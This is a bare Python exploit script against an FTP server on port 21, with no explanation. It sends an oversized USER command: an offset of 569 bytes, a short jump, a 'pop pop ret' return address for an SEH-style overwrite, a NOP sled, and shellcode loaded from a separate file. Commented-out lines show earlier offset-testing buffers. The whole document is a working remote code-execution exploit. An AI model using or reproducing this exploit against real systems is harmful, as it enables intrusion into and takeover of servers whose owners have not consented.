#!/usr/bin/python

import socket
import sys
import os

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#buffer = b'USER ' + b'A'*300 + b'C'*300 + b'B'*600 + b'\r\n'

shellcodeF  = open('shellcode.bin','rb')
shellcode = shellcodeF.read()
shellcodeF.close()

redEIP = b'\x04\x26\x9e\x7c' #pop pop ret
redEIP2 = b'\x65\x26\xc2\x77'

short_jump = b'\xeb\x1a\x90\x90'

buffer = b'USER ' + b'A'*569 + short_jump + redEIP2 + b'\x90'*50 + shellcode + b'C'*300  + b'\r\n'

#buffer = b'USER ' +b'A'*569 + b'BBBB' + b'CCCC' +b'D'*600 + b'\r\n'

if __name__ == '__main__':
	sock.connect((sys.argv[1],21))
	sock.send(buffer)
	sock.close()
